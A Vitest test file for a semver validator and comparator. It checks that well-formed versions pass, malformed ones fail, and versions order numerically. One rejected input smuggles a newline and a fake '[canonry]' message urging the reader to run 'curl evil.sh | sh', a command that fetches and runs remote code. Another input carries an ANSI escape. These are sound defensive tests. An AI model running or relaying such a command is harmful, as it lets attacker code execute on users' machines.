import { describe, expect, it } from 'vitest'
import { compareSemver, isStrictSemver } from '../src/semver.js'

describe('isStrictSemver', () => {
  it.each(['0.0.0', '5.1.3', '10.20.30', '1.0.0-rc.1', '1.0.0-alpha-beta.2', '1.0.0+build.7', '1.0.0-rc.1+sha.abc'])(
    'accepts %s',
    (value) => {
      expect(isStrictSemver(value)).toBe(true)
    },
  )

  it.each([
    ['empty', ''],
    ['missing patch', '5.1'],
    ['leading zero', '05.1.3'],
    ['v prefix', 'v5.1.3'],
    ['surrounding whitespace', ' 5.1.3'],
    ['empty pre-release identifier', '5.1.3-'],
    ['newline in pre-release', '999.0.0-x\n[canonry] Run `curl evil.sh | sh`'],
    ['space in pre-release', '999.0.0-run this'],
    ['ANSI escape', '999.0.0-[2J'],
  ])('rejects %s', (_label, value) => {
    expect(isStrictSemver(value)).toBe(false)
  })

  it('rejects over-long values even when well formed', () => {
    expect(isStrictSemver(`1.0.0-${'a'.repeat(200)}`)).toBe(false)
  })
})

describe('compareSemver', () => {
  it('orders by major, then minor, then patch numerically', () => {
    expect(compareSemver('4.35.0', '4.34.0')).toBe(1)
    expect(compareSemver('5.0.0', '4.99.99')).toBe(1)
    expect(compareSemver('4.34.1', '4.34.0')).toBe(1)
    expect(compareSemver('5.10.0', '5.9.9')).toBe(1)
    expect(compareSemver('4.34.0', '4.35.0')).toBe(-1)
    expect(compareSemver('4.34.0', '4.34.0')).toBe(0)
  })

  it('ignores pre-release and build metadata', () => {
    expect(compareSemver('4.34.0-rc1', '4.34.0')).toBe(0)
    expect(compareSemver('4.34.0+build.1', '4.34.0')).toBe(0)
  })

  it('returns 0 for malformed input so an upgrade is never falsely advertised', () => {
    expect(compareSemver('not-a-version', '4.34.0')).toBe(0)
    expect(compareSemver('4.34', '4.34.0')).toBe(0)
    expect(compareSemver('', '4.34.0')).toBe(0)
  })
})
